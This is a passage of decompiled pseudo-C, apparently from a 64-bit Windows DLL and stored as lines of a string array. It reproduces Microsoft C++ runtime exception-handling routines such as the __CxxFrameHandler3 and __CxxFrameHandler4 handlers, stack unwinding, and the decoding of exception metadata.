    "",
    "",
    "LONG __fastcall sub_1800125E4(unsigned int a1)",
    "{",
    "  ULONG64 Rip; // rbx",
    "  struct _IMAGE_RUNTIME_FUNCTION_ENTRY *v3; // rax",
    "  BOOL v4; // ebx",
    "  LONG result; // eax",
    "  struct _EXCEPTION_POINTERS ExceptionInfo; // [rsp+40h] [rbp-C0h] BYREF",
    "  _DWORD v7[4]; // [rsp+50h] [rbp-B0h] BYREF",
    "  DWORD64 v8; // [rsp+60h] [rbp-A0h]",
    "  struct _CONTEXT ContextRecord; // [rsp+F0h] [rbp-10h] BYREF",
    "  DWORD64 retaddr; // [rsp+5C8h] [rbp+4C8h]",
    "  __int64 v11; // [rsp+5D0h] [rbp+4D0h] BYREF",
    "  unsigned __int64 ImageBase; // [rsp+5D8h] [rbp+4D8h] BYREF",
    "  unsigned __int64 EstablisherFrame; // [rsp+5E0h] [rbp+4E0h] BYREF",
    "  PVOID HandlerData; // [rsp+5E8h] [rbp+4E8h] BYREF",
    "",
    "  if ( IsProcessorFeaturePresent(0x17u) )",
    "    __fastfail(a1);",
    "  sub_1800125DC(3);",
    "  sub_1800368A0(&ContextRecord, 0, 1232);",
    "  RtlCaptureContext(&ContextRecord);",
    "  Rip = ContextRecord.Rip;",
    "  v3 = RtlLookupFunctionEntry(ContextRecord.Rip, &ImageBase, 0);",
    "  if ( v3 )",
    "    RtlVirtualUnwind(0, ImageBase, Rip, v3, &ContextRecord, &HandlerData, &EstablisherFrame, 0);",
    "  ContextRecord.Rip = retaddr;",
    "  ContextRecord.Rsp = (DWORD64)&v11;",
    "  sub_1800368A0(v7, 0, 152);",
    "  v8 = retaddr;",
    "  v7[0] = 1073741845;",
    "  v7[1] = 1;",
    "  v4 = IsDebuggerPresent();",
    "  ExceptionInfo.ExceptionRecord = (PEXCEPTION_RECORD)v7;",
    "  ExceptionInfo.ContextRecord = &ContextRecord;",
    "  SetUnhandledExceptionFilter(0);",
    "  result = UnhandledExceptionFilter(&ExceptionInfo);",
    "  if ( !result && !v4 )",
    "    return sub_1800125DC(3);",
    "  return result;",
    "}",
    "",
    "",
    "void sub_18001272C()",
    "{",
    "  void (**i)(void); // rbx",
    "",
    "  for ( i = qword_180046930; i < qword_180046930; ++i )",
    "  {",
    "    if ( *i )",
    "      (*i)();",
    "  }",
    "}",
    "",
    "",
    "void sub_180012768()",
    "{",
    "  void (**i)(void); // rbx",
    "",
    "  for ( i = &qword_180046940; i < &qword_180046940; ++i )",
    "  {",
    "    if ( *i )",
    "      (*i)();",
    "  }",
    "}",
    "",
    "",
    "_BOOL8 __uncaught_exception(void)",
    "{",
    "  return dword_18004E200 != 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800127B0(unsigned int *a1, __int64 a2, __int64 a3)",
    "{",
    "  __int64 v4; // rax",
    "  _QWORD v6[4]; // [rsp+58h] [rbp-20h] BYREF",
    "",
    "  v6[0] = a1;",
    "  v6[1] = a3;",
    "  v4 = sub_180013A9C();",
    "  (*(void (__fastcall **)(_QWORD, _QWORD *))(v4 + 16))(*a1, v6);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180012804(unsigned int *a1, __int64 a2, __int64 a3)",
    "{",
    "  __int64 v4; // rax",
    "  _QWORD v6[4]; // [rsp+58h] [rbp-20h] BYREF",
    "",
    "  v6[0] = a1;",
    "  v6[1] = a3;",
    "  v4 = sub_180013A9C();",
    "  (*(void (__fastcall **)(_QWORD, _QWORD *))(v4 + 16))(*a1, v6);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180012858(__int64 a1, int a2)",
    "{",
    "  int v2; // edi",
    "  __int64 result; // rax",
    "",
    "  v2 = *(_DWORD *)(a1 + 12);",
    "  if ( !v2 )",
    "    return 0;",
    "  while ( 1 )",
    "  {",
    "    result = *(_QWORD *)(sub_180013A9C() + 96) + 20LL * (unsigned int)--v2 + *(int *)(a1 + 16);",
    "    if ( a2 > *(_DWORD *)(result + 4) && a2 <= *(_DWORD *)(result + 8) )",
    "      break;",
    "    if ( !v2 )",
    "      return 0;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800128BC(_BYTE *a1, __int64 a2, __int64 a3, int a4, char a5)",
    "{",
    "  char v5; // r11",
    "  int *v6; // r10",
    "  __int64 v11; // rcx",
    "  int v12; // eax",
    "  int v13; // eax",
    "  int v14; // r9d",
    "  _BYTE *v15; // r8",
    "  _BYTE *v16; // rdx",
    "  __int64 v17; // rcx",
    "  int *v18; // rdx",
    "  unsigned int v19; // r10d",
    "  int v20; // eax",
    "  int v21; // ecx",
    "  __int64 v22; // rcx",
    "",
    "  v5 = *a1;",
    "  v6 = (int *)(a1 + 1);",
    "  *(_BYTE *)a2 = *a1;",
    "  if ( (v5 & 4) != 0 )",
    "  {",
    "    v11 = *(_BYTE *)v6 & 0xF;",
    "    v6 = (int *)((char *)v6 - byte_18003AB58[v11]);",
    "    *(_DWORD *)(a2 + 4) = (unsigned int)*(v6 - 1) >> byte_18003AB58[v11 + 16];",
    "  }",
    "  if ( (v5 & 8) != 0 )",
    "  {",
    "    v12 = *v6++;",
    "    *(_DWORD *)(a2 + 8) = v12;",
    "  }",
    "  if ( (v5 & 0x10) != 0 )",
    "  {",
    "    v13 = *v6++;",
    "    *(_DWORD *)(a2 + 12) = v13;",
    "  }",
    "  v14 = 0;",
    "  v15 = v6 + 1;",
    "  if ( a5 || (v5 & 2) == 0 )",
    "  {",
    "    *(_DWORD *)(a2 + 16) = *v6;",
    "  }",
    "  else",
    "  {",
    "    *(_DWORD *)(a2 + 16) = 0;",
    "    if ( !*v6 )",
    "      __fastfail(7u);",
    "    v16 = (_BYTE *)(a3 + *v6);",
    "    v17 = *v16 & 0xF;",
    "    v18 = (int *)&v16[-byte_18003AB58[v17]];",
    "    v19 = (unsigned int)*(v18 - 1) >> byte_18003AB58[v17 + 16];",
    "    if ( v19 )",
    "    {",
    "      while ( 1 )",
    "      {",
    "        v20 = *v18;",
    "        v21 = v18[1];",
    "        v18 += 2;",
    "        if ( v20 == a4 )",
    "          break;",
    "        if ( ++v14 >= v19 )",
    "          goto LABEL_17;",
    "      }",
    "      *(_DWORD *)(a2 + 16) = v21;",
    "    }",
    "  }",
    "LABEL_17:",
    "  if ( (v5 & 1) != 0 )",
    "  {",
    "    v22 = *v15 & 0xF;",
    "    v15 -= byte_18003AB58[v22];",
    "    *(_DWORD *)(a2 + 20) = *((_DWORD *)v15 - 1) >> byte_18003AB58[v22 + 16];",
    "  }",
    "  return v15 - a1;",
    "}",
    "",
    "",
    "bool __fastcall sub_1800129F4(__int64 a1, __int64 a2)",
    "{",
    "  int v3; // eax",
    "",
    "  v3 = sub_180013CD0(a2, a1);",
    "  return sub_180012858(a2, v3) != 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180012A28(__int64 a1, __int64 a2, __int64 a3)",
    "{",
    "  __int64 v5; // rsi",
    "  int v6; // eax",
    "  __int64 v7; // rax",
    "  __int64 v8; // r9",
    "  char v10; // [rsp+48h] [rbp+20h] BYREF",
    "",
    "  v5 = sub_180012AC0(a1, a2, a3, &v10);",
    "  v6 = sub_180013CD0(a3, a2);",
    "  v7 = sub_180012858(a3, v6);",
    "  if ( v7 )",
    "    v8 = *(unsigned int *)(v7 + 4);",
    "  else",
    "    v8 = 0xFFFFFFFFLL;",
    "  return sub_180016494(v5, a2, a3, v8);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180012A8C(__int64 *a1, __int64 a2, __int64 a3)",
    "{",
    "  bool v3; // zf",
    "  __int64 v4; // rcx",
    "  __int64 v6; // [rsp+30h] [rbp+8h] BYREF",
    "",
    "  v3 = (*(_BYTE *)a3 & 1) == 0;",
    "  v4 = *a1;",
    "  v6 = v4;",
    "  if ( !v3 )",
    "    v6 = *(_QWORD *)(*(unsigned int *)(a3 + 20) + v4);",
    "  return sub_180016620(&v6, a2, a3, 0xFFFFFFFFLL);",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_180012AC0(_QWORD *a1, ULONG64 *a2, __int64 a3, _QWORD *a4)",
    "{",
    "  int v4; // esi",
    "  int v9; // ebp",
    "  _DWORD *v10; // rbx",
    "  PRUNTIME_FUNCTION v11; // rax",
    "  __int64 v12; // rcx",
    "  unsigned __int64 v13; // r8",
    "  unsigned int v14; // r9d",
    "  _DWORD *v15; // rdx",
    "  unsigned __int64 ImageBase; // [rsp+50h] [rbp+8h] BYREF",
    "",
    "  v4 = *(_DWORD *)(a3 + 12);",
    "  v9 = sub_180013CD0(a3, a2);",
    "  *a4 = *a1;",
    "  while ( v4 )",
    "  {",
    "    v10 = (_DWORD *)(a2[1] + *(int *)(a3 + 16) + 20LL * (unsigned int)--v4);",
    "    if ( v9 > v10[1] && v9 <= v10[2] )",
    "    {",
    "      v11 = RtlLookupFunctionEntry(*a2, &ImageBase, 0);",
    "      v12 = 0;",
    "      v13 = ImageBase + (int)v10[4];",
    "      v14 = v10[3];",
    "      if ( v14 )",
    "      {",
    "        v15 = (_DWORD *)(v13 + 12);",
    "        do",
    "        {",
    "          if ( *v15 == (unsigned __int64)v11->BeginAddress )",
    "            break;",
    "          v12 = (unsigned int)(v12 + 1);",
    "          v15 += 5;",
    "        }",
    "        while ( (unsigned int)v12 < v14 );",
    "      }",
    "      if ( (unsigned int)v12 < v14 )",
    "      {",
    "        *a4 = *(_QWORD *)(*(int *)(v13 + 20 * v12 + 16) + *a1);",
    "        return a4;",
    "      }",
    "    }",
    "  }",
    "  return a4;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_180012BB4(_OWORD *a1, __int64 a2, int a3, __int64 a4, __int64 a5)",
    "{",
    "  unsigned int v9; // ebp",
    "  unsigned int v10; // eax",
    "  __int64 v11; // rdx",
    "  __int64 v12; // rcx",
    "  __int64 v13; // r8",
    "  int v14; // r10d",
    "  int v15; // r9d",
    "  __int64 v16; // r11",
    "  __int64 v17; // rbx",
    "  int v18; // r8d",
    "  int v19; // r13d",
    "  unsigned int v20; // edx",
    "  __int64 v21; // rdi",
    "  __int64 v22; // rax",
    "  __int64 v23; // r9",
    "  unsigned int v24; // edx",
    "  _DWORD *v25; // rcx",
    "  int v26; // eax",
    "  _OWORD *result; // rax",
    "  __int128 v28; // [rsp+20h] [rbp-48h]",
    "  __int128 v29; // [rsp+30h] [rbp-38h]",
    "",
    "  v9 = *(_DWORD *)(a5 + 12);",
    "  v10 = sub_180013CD0(a5, a4);",
    "  v14 = 0;",
    "  v15 = v10;",
    "  if ( !v9 )",
    "    sub_1800219B0(v12, v11, v13, v10);",
    "  v16 = *(_QWORD *)(a4 + 8);",
    "  v17 = *(int *)(a5 + 16);",
    "  v18 = -1;",
    "  v19 = -1;",
    "  v20 = v9;",
    "  do",
    "  {",
    "    v21 = v20 - 1;",
    "    v22 = v16 + 20 * v21;",
    "    if ( v15 > *(_DWORD *)(v22 + v17 + 4) && v15 <= *(_DWORD *)(v22 + v17 + 8) )",
    "      break;",
    "    --v20;",
    "  }",
    "  while ( (_DWORD)v21 );",
    "  if ( v20 )",
    "    v23 = v17 + v16 + 20LL * (v20 - 1);",
    "  else",
    "    v23 = 0;",
    "  v24 = 0;",
    "  v25 = (_DWORD *)(v16 + v17);",
    "  do",
    "  {",
    "    if ( (!v23 || *v25 > *(_DWORD *)(v23 + 4) && v25[1] <= *(_DWORD *)(v23 + 8)) && a3 >= *v25 && a3 <= v25[1] )",
    "    {",
    "      v19 = v24;",
    "      if ( v18 == -1 )",
    "        v18 = v24;",
    "    }",
    "    ++v24;",
    "    v25 += 5;",
    "  }",
    "  while ( v24 < v9 );",
    "  v26 = 0;",
    "  *(_QWORD *)&v28 = a2;",
    "  *(_QWORD *)&v29 = a2;",
    "  if ( v18 != -1 )",
    "    v26 = v18;",
    "  DWORD2(v28) = v26;",
    "  if ( v18 != -1 )",
    "    v14 = v19 + 1;",
    "  result = a1;",
    "  DWORD2(v29) = v14;",
    "  *a1 = v28;",
    "  a1[1] = v29;",
    "  return result;",
    "}",
    "",
    "",
    "_OWORD *__fastcall sub_180012CE8(_OWORD *a1, int *a2, int a3)",
    "{",
    "  __int128 v5; // xmm6",
    "  int v7; // esi",
    "  int v8; // r9d",
    "  int v9; // edx",
    "  _BYTE *v10; // r8",
    "  __int64 v11; // rax",
    "  __int64 v12; // rcx",
    "  _BYTE *v13; // r8",
    "  int v14; // eax",
    "  __int64 v15; // rcx",
    "  _BYTE *v16; // r8",
    "  int v17; // eax",
    "  __int64 v18; // rcx",
    "  _DWORD *v19; // r8",
    "  int v20; // eax",
    "  int v21; // eax",
    "  _OWORD *result; // rax",
    "  __int128 v23; // [rsp+20h] [rbp-48h]",
    "  __int128 v24; // [rsp+30h] [rbp-38h]",
    "  __int128 v25; // [rsp+40h] [rbp-28h] BYREF",
    "",
    "  *(_QWORD *)&v23 = a2;",
    "  *(_QWORD *)&v24 = a2;",
    "  DWORD2(v23) = 0;",
    "  v5 = v23;",
    "  v25 = v23;",
    "  v7 = 0;",
    "  sub_180013078(a2, &v25);",
    "  v8 = *a2;",
    "  v9 = 0;",
    "  if ( *a2 )",
    "  {",
    "    v10 = (_BYTE *)*((_QWORD *)a2 + 1);",
    "    do",
    "    {",
    "      v11 = *((_QWORD *)a2 + 3);",
    "      if ( a3 >= (int)v11 && a3 <= SHIDWORD(v11) )",
    "      {",
    "        v7 = v9;",
    "        DWORD2(v23) = 0;",
    "        v5 = v23;",
    "      }",
    "      ++v9;",
    "      v12 = *v10 & 0xF;",
    "      v13 = &v10[-byte_18003AB58[v12]];",
    "      v14 = *((_DWORD *)v13 - 1) >> byte_18003AB58[v12 + 16];",
    "      *((_QWORD *)a2 + 1) = v13;",
    "      a2[6] = v14;",
    "      v15 = *v13 & 0xF;",
    "      v16 = &v13[-byte_18003AB58[v15]];",
    "      v17 = *((_DWORD *)v16 - 1) >> byte_18003AB58[v15 + 16];",
    "      *((_QWORD *)a2 + 1) = v16;",
    "      a2[7] = v17;",
    "      v18 = *v16 & 0xF;",
    "      v19 = &v16[-byte_18003AB58[v18]];",
    "      v20 = *(v19 - 1) >> byte_18003AB58[v18 + 16];",
    "      *((_QWORD *)a2 + 1) = v19;",
    "      a2[8] = v20;",
    "      v21 = *v19;",
    "      v10 = v19 + 1;",
    "      *((_QWORD *)a2 + 1) = v10;",
    "      a2[9] = v21;",
    "    }",
    "    while ( v9 != v8 );",
    "  }",
    "  v25 = v5;",
    "  DWORD2(v24) = v7 + 1;",
    "  sub_180013078(a2, &v25);",
    "  result = a1;",
    "  *a1 = v5;",
    "  a1[1] = v24;",
    "  return result;",
    "}",
    "",
    "",
    "void __fastcall sub_180012E54(",
    "        void **a1,",
    "        __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        __int64 a6,",
    "        int a7,",
    "        int a8,",
    "        int a9,",
    "        __int64 a10,",
    "        unsigned __int8 a11)",
    "{",
    "  void *v11; // rcx",
    "  struct _CONTEXT *ContextRecord; // rax",
    "  void *v13; // rdx",
    "  struct _UNWIND_HISTORY_TABLE *HistoryTable; // [rsp+28h] [rbp-99h]",
    "  _BYTE ExceptionRecord[160]; // [rsp+30h] [rbp-91h] BYREF",
    "",
    "  *(_OWORD *)ExceptionRecord = unk_18003AC20;",
    "  *(_OWORD *)&ExceptionRecord[16] = unk_18003AC30;",
    "  *(_OWORD *)&ExceptionRecord[32] = unk_18003AC40;",
    "  memset(&ExceptionRecord[48], 0, 104);",
    "  v11 = *a1;",
    "  *(_QWORD *)&ExceptionRecord[32] = sub_180015E10;",
    "  *(_QWORD *)&ExceptionRecord[48] = a5;",
    "  *(_QWORD *)&ExceptionRecord[56] = a7;",
    "  *(_QWORD *)&ExceptionRecord[72] = a6;",
    "  *(_QWORD *)&ExceptionRecord[88] = a11;",
    "  HistoryTable = *(struct _UNWIND_HISTORY_TABLE **)(a10 + 64);",
    "  ContextRecord = *(struct _CONTEXT **)(a10 + 40);",
    "  *(_QWORD *)&ExceptionRecord[40] = a4;",
    "  *(_QWORD *)&ExceptionRecord[64] = a3;",
    "  *(_QWORD *)&ExceptionRecord[80] = a2;",
    "  v13 = *(void **)a10;",
    "  *(_QWORD *)&ExceptionRecord[96] = 429065504;",
    "  RtlUnwindEx(v11, v13, (PEXCEPTION_RECORD)ExceptionRecord, 0, ContextRecord, HistoryTable);",
    "}",
    "",
    "",
    "void __fastcall sub_180012F58(",
    "        void **a1,",
    "        __int64 a2,",
    "        __int64 a3,",
    "        __int64 a4,",
    "        __int64 a5,",
    "        int a6,",
    "        int a7,",
    "        int a8,",
    "        __int64 a9,",
    "        __int64 a10,",
    "        unsigned __int8 a11)",
    "{",
    "  __int64 v12; // rcx",
    "  __int64 v13; // r8",
    "  struct _CONTEXT *ContextRecord; // rax",
    "  void *v15; // rcx",
    "  void *v16; // rdx",
    "  struct _UNWIND_HISTORY_TABLE *HistoryTable; // [rsp+28h] [rbp-99h]",
    "  _BYTE ExceptionRecord[160]; // [rsp+30h] [rbp-91h] BYREF",
    "",
    "  *(_OWORD *)ExceptionRecord = unk_18003AB80;",
    "  *(_OWORD *)&ExceptionRecord[16] = unk_18003AB90;",
    "  *(_QWORD *)&ExceptionRecord[40] = unk_18003ABA8;",
    "  *(_QWORD *)&ExceptionRecord[72] = unk_18003ABC8;",
    "  *(_QWORD *)&ExceptionRecord[80] = unk_18003ABD0;",
    "  memset(&ExceptionRecord[96], 0, 56);",
    "  *(_QWORD *)&ExceptionRecord[32] = sub_180015FFC;",
    "  *(_QWORD *)&ExceptionRecord[48] = a5;",
    "  *(_QWORD *)&ExceptionRecord[64] = a3;",
    "  *(_QWORD *)&ExceptionRecord[56] = a7;",
    "  *(_QWORD *)&ExceptionRecord[88] = a11;",
    "  v12 = *(_QWORD *)(a10 + 8) + *(_QWORD *)(a9 + 24);",
    "  v13 = *(_QWORD *)(a10 + 8) + *(_QWORD *)(a9 + 32);",
    "  *(_QWORD *)&ExceptionRecord[120] = a8;",
    "  HistoryTable = *(struct _UNWIND_HISTORY_TABLE **)(a10 + 64);",
    "  ContextRecord = *(struct _CONTEXT **)(a10 + 40);",
    "  *(_QWORD *)&ExceptionRecord[40] = a4;",
    "  *(_QWORD *)&ExceptionRecord[72] = v12;",
    "  v15 = *a1;",
    "  *(_QWORD *)&ExceptionRecord[80] = a2;",
    "  v16 = *(void **)a10;",
    "  *(_QWORD *)&ExceptionRecord[104] = v13;",
    "  *(_QWORD *)&ExceptionRecord[96] = 429065504;",
    "  RtlUnwindEx(v15, v16, (PEXCEPTION_RECORD)ExceptionRecord, 0, ContextRecord, HistoryTable);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013078(__int64 a1, __int64 a2)",
    "{",
    "  _BYTE *v2; // r8",
    "  __int64 v4; // rcx",
    "  _BYTE *v5; // r8",
    "  int v6; // eax",
    "  __int64 v7; // rcx",
    "  __int64 v8; // rax",
    "  _BYTE *v9; // r8",
    "  __int64 v10; // rcx",
    "  __int64 v11; // rax",
    "  unsigned int *v12; // r8",
    "  __int64 result; // rax",
    "  _BYTE *v14; // r8",
    "  bool v15; // zf",
    "  __int64 v16; // r10",
    "  __int64 v17; // rcx",
    "  __int64 v18; // rax",
    "  _BYTE *v19; // r8",
    "  __int64 v20; // rcx",
    "  __int64 v21; // rax",
    "  _BYTE *v22; // r8",
    "  __int64 v23; // rcx",
    "  __int64 v24; // rax",
    "  _BYTE *v25; // r8",
    "  __int64 v26; // rcx",
    "  __int64 v27; // rax",
    "  _BYTE *v28; // rdx",
    "  __int64 v29; // rcx",
    "  _BYTE *v30; // rdx",
    "  __int64 v31; // rcx",
    "  unsigned int *v32; // rdx",
    "",
    "  v2 = *(_BYTE **)(a1 + 16);",
    "  *(_QWORD *)(a1 + 8) = v2;",
    "  v4 = *v2 & 0xF;",
    "  v5 = &v2[-byte_18003AB58[v4]];",
    "  v6 = *((_DWORD *)v5 - 1) >> byte_18003AB58[v4 + 16];",
    "  *(_QWORD *)(a1 + 8) = v5;",
    "  *(_DWORD *)(a1 + 24) = v6;",
    "  v7 = *v5 & 0xF;",
    "  v8 = byte_18003AB58[v7];",
    "  LOBYTE(v7) = byte_18003AB58[v7 + 16];",
    "  v9 = &v5[-v8];",
    "  LODWORD(v8) = *((_DWORD *)v9 - 1);",
    "  *(_QWORD *)(a1 + 8) = v9;",
    "  *(_DWORD *)(a1 + 28) = (unsigned int)v8 >> v7;",
    "  v10 = *v9 & 0xF;",
    "  v11 = byte_18003AB58[v10];",
    "  LOBYTE(v10) = byte_18003AB58[v10 + 16];",
    "  v12 = (unsigned int *)&v9[-v11];",
    "  LODWORD(v11) = *(v12 - 1);",
    "  *(_QWORD *)(a1 + 8) = v12;",
    "  *(_DWORD *)(a1 + 32) = (unsigned int)v11 >> v10;",
    "  result = *v12;",
    "  v14 = v12 + 1;",
    "  v15 = *(_DWORD *)(a2 + 8) == 0;",
    "  *(_QWORD *)(a1 + 8) = v14;",
    "  *(_DWORD *)(a1 + 36) = result;",
    "  if ( !v15 )",
    "  {",
    "    v16 = *(unsigned int *)(a2 + 8);",
    "    do",
    "    {",
    "      v17 = *v14 & 0xF;",
    "      v18 = byte_18003AB58[v17];",
    "      LOBYTE(v17) = byte_18003AB58[v17 + 16];",
    "      v19 = &v14[-v18];",
    "      LODWORD(v18) = *((_DWORD *)v19 - 1);",
    "      *(_QWORD *)(a1 + 8) = v19;",
    "      *(_DWORD *)(a1 + 24) = (unsigned int)v18 >> v17;",
    "      v20 = *v19 & 0xF;",
    "      v21 = byte_18003AB58[v20];",
    "      LOBYTE(v20) = byte_18003AB58[v20 + 16];",
    "      v22 = &v19[-v21];",
    "      LODWORD(v21) = *((_DWORD *)v22 - 1);",
    "      *(_QWORD *)(a1 + 8) = v22;",
    "      *(_DWORD *)(a1 + 28) = (unsigned int)v21 >> v20;",
    "      v23 = *v22 & 0xF;",
    "      v24 = byte_18003AB58[v23];",
    "      LOBYTE(v23) = byte_18003AB58[v23 + 16];",
    "      v25 = &v22[-v24];",
    "      LODWORD(v24) = *((_DWORD *)v25 - 1);",
    "      *(_QWORD *)(a1 + 8) = v25;",
    "      *(_DWORD *)(a1 + 32) = (unsigned int)v24 >> v23;",
    "      LODWORD(v24) = *(_DWORD *)v25;",
    "      *(_QWORD *)(a1 + 8) = v25 + 4;",
    "      *(_DWORD *)(a1 + 36) = v24;",
    "      v26 = v25[4] & 0xF;",
    "      v27 = byte_18003AB58[v26];",
    "      v28 = &v25[-v27 + 4];",
    "      LODWORD(v27) = *(_DWORD *)&v25[-v27] >> byte_18003AB58[v26 + 16];",
    "      *(_QWORD *)(a1 + 8) = v28;",
    "      *(_DWORD *)(a1 + 24) = v27;",
    "      v29 = *v28 & 0xF;",
    "      v30 = &v28[-byte_18003AB58[v29]];",
    "      LODWORD(v27) = *((_DWORD *)v30 - 1) >> byte_18003AB58[v29 + 16];",
    "      *(_QWORD *)(a1 + 8) = v30;",
    "      *(_DWORD *)(a1 + 28) = v27;",
    "      v31 = *v30 & 0xF;",
    "      v32 = (unsigned int *)&v30[-byte_18003AB58[v31]];",
    "      v14 = v32 + 1;",
    "      LODWORD(v27) = *(v32 - 1) >> byte_18003AB58[v31 + 16];",
    "      *(_QWORD *)(a1 + 8) = v32;",
    "      *(_DWORD *)(a1 + 32) = v27;",
    "      result = *v32;",
    "      *(_QWORD *)(a1 + 8) = v32 + 1;",
    "      *(_DWORD *)(a1 + 36) = result;",
    "      --v16;",
    "    }",
    "    while ( v16 );",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "_QWORD *__fastcall sub_18001323C(_QWORD *a1, __int64 a2)",
    "{",
    "  __int64 v3; // rcx",
    "",
    "  *a1 = a2;",
    "  if ( (unsigned __int64)a1 >= *(_QWORD *)(sub_180013A9C() + 88) )",
    "    v3 = 0;",
    "  else",
    "    v3 = *(_QWORD *)(sub_180013A9C() + 88);",
    "  a1[1] = v3;",
    "  *(_QWORD *)(sub_180013A9C() + 88) = a1;",
    "  return a1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013278(__int64 a1)",
    "{",
    "  __int64 v2; // rdx",
    "  __int64 v3; // rcx",
    "  __int64 v4; // r8",
    "  __int64 v5; // r9",
    "  __int64 v6; // rbx",
    "  __int64 result; // rax",
    "",
    "  if ( a1 != *(_QWORD *)(sub_180013A9C() + 88) || (v2 = *(_QWORD *)(sub_180013A9C() + 88)) == 0 )",
    "LABEL_7:",
    "    sub_1800219B0(v3, v2, v4, v5);",
    "  while ( 1 )",
    "  {",
    "    v6 = *(_QWORD *)(v2 + 8);",
    "    if ( a1 == v2 )",
    "      break;",
    "    v2 = *(_QWORD *)(v2 + 8);",
    "    if ( !v6 )",
    "      goto LABEL_7;",
    "  }",
    "  result = sub_180013A9C();",
    "  *(_QWORD *)(result + 88) = v6;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 sub_1800132CC()",
    "{",
    "  return *(_QWORD *)(sub_180013A9C() + 96);",
    "}",
    "",
    "",
    "__int64 sub_1800132E0()",
    "{",
    "  return *(_QWORD *)(sub_180013A9C() + 104);",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800132F4(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = sub_180013A9C();",
    "  *(_QWORD *)(result + 96) = a1;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001330C(__int64 a1)",
    "{",
    "  __int64 result; // rax",
    "",
    "  result = sub_180013A9C();",
    "  *(_QWORD *)(result + 104) = a1;",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall _CxxFrameHandler3(__int64 a1, __int64 a2, __int64 a3, __int64 a4)",
    "{",
    "  __int64 v4; // rbx",
    "  __int64 v8; // rbx",
    "  __int64 v9; // rax",
    "  char v11; // [rsp+38h] [rbp-10h]",
    "  __int64 v12; // [rsp+50h] [rbp+8h] BYREF",
    "",
    "  v4 = *(_QWORD *)(a4 + 8);",
    "  v12 = a2;",
    "  *(_QWORD *)(sub_180013A9C() + 96) = v4;",
    "  v8 = *(_QWORD *)(a1 + 56);",
    "  *(_QWORD *)(sub_180013A9C() + 104) = v8;",
    "  v9 = sub_180013A9C();",
    "  v11 = 0;",
    "  return sub_180015BF8(a1, &v12, a3, a4, *(_QWORD *)(v9 + 96) + **(unsigned int **)(a4 + 56), 0, 0, v11);",
    "}",
    "",
    "",
    "__int64 __fastcall _CxxFrameHandler4(__int64 a1, __int64 a2, int a3, __int64 a4)",
    "{",
    "  __int64 v7; // rbx",
    "  __int64 v8; // rbx",
    "  __int64 v9; // rax",
    "  _BYTE v11[4]; // [rsp+40h] [rbp-28h] BYREF",
    "  int v12; // [rsp+44h] [rbp-24h]",
    "  int v13; // [rsp+48h] [rbp-20h]",
    "  int v14; // [rsp+4Ch] [rbp-1Ch]",
    "  int v15; // [rsp+50h] [rbp-18h]",
    "  int v16; // [rsp+54h] [rbp-14h]",
    "  __int64 v17; // [rsp+70h] [rbp+8h] BYREF",
    "",
    "  v12 = 0;",
    "  v13 = 0;",
    "  v14 = 0;",
    "  v15 = 0;",
    "  v16 = 0;",
    "  v7 = *(_QWORD *)(a4 + 8);",
    "  v11[0] = 0;",
    "  v17 = a2;",
    "  *(_QWORD *)(sub_180013A9C() + 96) = v7;",
    "  v8 = *(_QWORD *)(a1 + 56);",
    "  *(_QWORD *)(sub_180013A9C() + 104) = v8;",
    "  v9 = sub_180013A9C();",
    "  sub_1800128BC(",
    "    (_BYTE *)(*(_QWORD *)(v9 + 96) + **(unsigned int **)(a4 + 56)),",
    "    (__int64)v11,",
    "    *(_QWORD *)(a4 + 8),",
    "    **(_DWORD **)(a4 + 16),",
    "    0);",
    "  return sub_180015C00(a1, (unsigned int)&v17, a3, a4, (__int64)v11, 0, 0, 0);",
    "}",
    "",
    "",
    "void __fastcall sub_18001346C(__int64 a1)",
    "{",
    "  __int64 v1; // rax",
    "  __int64 v2; // rdx",
    "  __int64 v3; // rcx",
    "",
    "  if ( a1 )",
    "  {",
    "    if ( *(_DWORD *)a1 == -529697949",
    "      && *(_DWORD *)(a1 + 24) == 4",
    "      && (unsigned int)(*(_DWORD *)(a1 + 32) - 429065504) <= 2 )",
    "    {",
    "      v1 = *(_QWORD *)(a1 + 48);",
    "      if ( v1 )",
    "      {",
    "        v2 = *(int *)(v1 + 4);",
    "        if ( (_DWORD)v2 )",
    "        {",
    "          ((void (__fastcall *)(_QWORD))(*(_QWORD *)(a1 + 56) + v2))(*(_QWORD *)(a1 + 40));",
    "        }",
    "        else if ( (*(_BYTE *)v1 & 0x10) != 0 )",
    "        {",
    "          v3 = **(_QWORD **)(a1 + 40);",
    "          if ( v3 )",
    "            (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 16LL))(v3);",
    "        }",
    "      }",
    "    }",
    "  }",
    "}",
    "",
    "",
    "__int64 __fastcall sub_1800134E0(__int64 a1)",
    "{",
    "  _QWORD *i; // rdx",
    "",
    "  for ( i = *(_QWORD **)(sub_180013A9C() + 88); ; i = (_QWORD *)i[1] )",
    "  {",
    "    if ( !i )",
    "      return 1;",
    "    if ( *i == a1 )",
    "      break;",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180013534(__int64 a1)",
    "{",
    "  _DWORD *v1; // rdi",
    "  __int64 v3; // rax",
    "  __int64 v5; // rbx",
    "",
    "  v1 = *(_DWORD **)a1;",
    "  if ( **(_DWORD **)a1 == -532462766 || *v1 == -532459699 )",
    "  {",
    "    if ( *(int *)(sub_180013A9C() + 48) > 0 )",
    "    {",
    "      v3 = sub_180013A9C();",
    "      --*(_DWORD *)(v3 + 48);",
    "    }",
    "  }",
